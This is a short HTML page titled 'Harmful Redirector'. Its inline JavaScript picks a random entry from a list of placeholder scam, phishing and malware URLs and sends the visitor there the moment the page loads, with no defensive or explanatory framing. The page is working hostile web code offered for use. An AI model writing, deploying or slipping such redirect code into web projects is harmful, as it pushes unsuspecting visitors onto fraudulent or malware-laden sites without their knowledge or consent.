<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Harmful Redirector</title>
    <script type="text/javascript">
        // List of harmful URLs
        var harmfulUrls = [
            "https://example-scamsite.com",
            "https://another-scamsite.com",
            "https://phishingsite.com",
            "https://malwaresite.com",
            // Add more harmful URLs as needed
        ];

        // Function to redirect to a random harmful URL
        function redirectToHarmfulSite() {
            var randomIndex = Math.floor(Math.random() * harmfulUrls.length);
            var randomUrl = harmfulUrls[randomIndex];
            window.location.href = randomUrl;
        }

        // Redirect immediately when the page loads
        window.onload = redirectToHarmfulSite;
    </script>
</head>
<body>
    <p>Redirecting to a harmful website...</p>
</body>
</html>
